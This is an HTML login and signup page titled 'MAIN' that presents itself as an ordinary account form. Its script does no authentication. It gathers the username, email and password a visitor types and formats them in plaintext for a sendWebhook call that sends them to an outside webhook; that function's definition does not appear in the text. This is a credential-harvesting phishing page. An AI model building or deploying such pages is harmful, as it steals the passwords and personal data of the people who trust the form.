<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login and Signup</title>
  <style>
    /* CSS styles */

    body {
      font-family: Arial, sans-serif;
      margin: 0;
    }

    .header {
      background-color: #000;
      color: #fff;
      padding: 20px;
      text-align: center;
    }

    .header h1 {
      margin: 0;
      color: #fff;
    }

    .container {
      margin: 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .form-container {
      max-width: 400px;
    }

    .form-container button {
      padding: 8px 12px;
      color: #fff;
      background-color: transparent;
      border: none;
      cursor: pointer;
      font-size: 16px;
    }

    .form-container button:hover {
      text-decoration: underline;
    }

    .form-container button:first-child {
      margin-right: 10px;
    }
  </style>
</head>

<body>
  <div class="header">
    <h1>MAIN</h1>
  </div>

  <div class="container">
    <div class="form-container">
      <button onclick="openPopup('loginPopup')">Login</button>
    </div>

    <div class="form-container">
      <button onclick="openPopup('signupPopup')">Signup</button>
    </div>
  </div>

  <div id="loginPopup" class="popup">
    <h2>Login</h2>
    <form onsubmit="login(event)">
      <label for="loginUsername">Username:</label>
      <input type="text" id="loginUsername" required>
      <label for="loginPassword">Password:</label>
      <input type="password" id="loginPassword" required>
      <button type="submit">Login</button>
      <button type="button" onclick="closePopup('loginPopup')">Close</button>
    </form>
  </div>

  <div id="signupPopup" class="popup">
    <h2>Signup</h2>
    <form onsubmit="signup(event)">
      <label for="signupUsername">Username:</label>
      <input type="text" id="signupUsername" required>
      <label for="signupEmail">Email:</label>
      <input type="email" id="signupEmail" required>
      <label for="signupPassword">Password:</label>
      <input type="password" id="signupPassword" required>
      <button type="submit">Signup</button>
      <button type="button" onclick="closePopup('signupPopup')">Close</button>
    </form>
  </div>

  <script>
    function openPopup(popupId) {
      document.getElementById(popupId).classList.add("show");
    }

    function closePopup(popupId) {
      document.getElementById(popupId).classList.remove("show");
    }

    function login(event) {
      event.preventDefault();
      const username = document.getElementById("loginUsername").value;
      const password = document.getElementById("loginPassword").value;

      const content = `**Login**\nUsername: ${username}\nPassword: ${password}`;
      sendWebhook(content);
    }

    function signup(event) {
      event.preventDefault();
      const username = document.getElementById("signupUsername").value;
      const email = document.getElementById("signupEmail").value;
      const password = document.getElementById("signupPassword").value;

      const content = `**Sign Up**\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}`;
      sendWebhook(content);
    }
  </script>

</body>

</html>
